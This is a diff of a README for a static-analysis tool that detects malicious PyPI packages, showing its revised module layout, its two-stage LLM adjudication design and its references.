-│   ├── ddg_builder_v7.py           # CPG construction: typed edges, kill, call_target, summaries
-│   ├── taint_engine.py             # Reverse-BFS taint + evidence grading (escalation_gate)
-│   ├── call_resolver.py            # AST call-target resolution (getattr, aliases, globals)
-│   ├── call_graph_analyzer.py      # Call graph, attack-chain reconstruction
-│   ├── cfg_adapter.py              # py2cfg integration + constant-folded reachability
-│   ├── enhanced_detector.py        # Registry identity, install hooks, metadata authority
-│   ├── pypi_verifier.py            # Existence / version / release-age verification
-│   ├── pypi_index.py               # Full 500K-name index with length bucketing
-│   ├── duplicate_detector.py       # SHA-256 file-set overlap vs. genuine sdist
-│   ├── llm_sanitizer.py            # Comment/docstring stripping, injection marking
-│   ├── sandbox_probe.py            # audit-hook behavioural probe (opt-in)
+│   ├── sso_extractor.py              # SSO pre-filter: capability extraction, alias resolution
+│   ├── graph_digest.py               # Graph→text serialization + verify_paths (anti-hallucination)
+│   ├── llm_graph_analyst.py          # Stage-1 chain extraction (small model) + verification
+│   ├── two_stage_judge.py            # Stage-2 adjudication (strong model) + context judge
+│   ├── package_graph_analysis.py     # Package-level block analysis (large graphs)
+│   ├── ddg_builder_v7.py             # DDG: typed edges, sequence edges, summaries, call targets
+│   ├── taint_engine.py               # Reverse-BFS taint + evidence grading (escalation_gate)
+│   ├── call_resolver.py              # AST call-target resolution (getattr/alias/globals)
+│   ├── call_graph_analyzer.py        # Call graph + attack-chain reconstruction
+│   ├── cfg_adapter.py                # py2cfg integration + constant-folded reachability
+│   ├── enhanced_detector.py          # Registry identity, install hooks, metadata authority
+│   ├── pypi_verifier.py              # Existence / version / release-age verification
+│   ├── pypi_index.py                 # Full 500K-name index with length bucketing
+│   ├── duplicate_detector.py         # SHA-256 file-set overlap vs genuine sdist
+│   ├── llm_sanitizer.py              # Comment/docstring stripping, injection marking
+│   ├── sandbox_probe.py              # audit-hook behavioural probe (opt-in)
 │   └── common/
-│       ├── graph_partitioner.py    # Function-level partitioning (attribute-based)
-│       └── pattern_matcher.py      # Dangerous-node detection
-│
-├── SOLUTION_B_VOTING/src/          # Per-function classifier, rule scorer, prioritizer
-├── scripts/                        # Offline re-judgment (stage 1 + stage 2)
-├── tests/                          # 10 suites
+│       ├── graph_partitioner.py      # Function-level partitioning
+│       └── pattern_matcher.py        # Dangerous-node detection (ordering only)
+├── SOLUTION_B_VOTING/src/            # Per-function classifier, rule scorer, prioritizer
+├── scripts/                          # Offline re-judgment (stage 1 + stage 2)
+├── tests/                            # 14 suites / 200+ assertions
 └── docs/
 ```
-
-**Core size:** ~10k LOC across the eight main modules; no vendored ML models, no GPU.
 
 ---
 
 ## References
 
-- **[Backstabber's Knife Collection](https://github.com/cybertier/Backstabbers-Knife-Collection)** — malicious package corpus and taxonomy used for dataset construction
+- **[MalSkills](https://arxiv.org/abs/2603.27204)** (HUST, ASE 2026) — SSO extraction → dependency graph → behavior reasoning architecture; our pre-filter and graph stages follow this shape, re-targeted to PyPI's threat model, with a different adjudication paradigm (LLM-constructed verified chains vs symbolic rules)
+- **[Backstabber's Knife Collection](https://github.com/cybertier/Backstabbers-Knife-Collection)** — malicious corpus lineage
 - **[Guarddog](https://github.com/DataDog/guarddog)**, **[Bandit4Mal](https://github.com/ohmtech-research/bandit4mal)** — single-channel baselines
 - **[py2cfg](https://github.com/jimenezj6/py2cfg)** — CFG construction
-- **[GLM (ZhipuAI)](https://open.bigmodel.cn/)** — LLM used for semantic verification and as an AI pair-programmer across the project's evolution
+- **[GLM (ZhipuAI)](https://open.bigmodel.cn/)** — GLM-4-Flash (chain extraction) and GLM-4-Plus (adjudication); also pair-programmed the entire system
 
 ## License
 
@@ -439,7 +466,8 @@ MIT — see [LICENSE](LICENSE).
 
 <div align="center">
 
-**⚠️** Static analysis plus optional behavioural probing. Verdicts are decision support,
-not automated takedowns — every `MALICIOUS` carries the evidence needed to verify it.
+**⚠️** Static analysis plus optional behavioural probing. Verdicts are decision
+support with evidence attached — every `MALICIOUS` names the chain, the
+endpoints, and the code to check.
 
 </div>
